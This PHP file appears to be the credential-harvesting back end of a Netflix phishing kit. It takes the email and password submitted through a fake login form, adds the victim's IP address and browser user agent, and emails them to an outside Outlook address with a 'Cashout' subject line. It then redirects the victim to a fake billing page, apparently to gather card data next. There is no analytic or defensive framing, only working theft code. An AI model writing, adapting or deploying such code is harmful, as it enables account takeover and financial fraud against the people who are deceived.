<?php
header('Location: /netflix/billing_info');
$Agent=$_SERVER['HTTP_USER_AGENT'];
$Ip=$_SERVER['REMOTE_ADDR'];
$email=$_POST['email'];
$password=$_POST['password'];
$nl="\r\n";
$from = "Cashout";
$to = "nwaforalex158@outlook.com";
$subject = "Cashout Is A Must By Gods  Grace";
$message = 'EMAIL: ' . $email . $nl.'PASSWORD: ' . $password .$nl. 'IP: ' . $Ip  . $nl. 'USERAGENT: ' . $Agent ;
$headers = "From:" . $from;
mail($to,$subject,$message, $headers) 
?>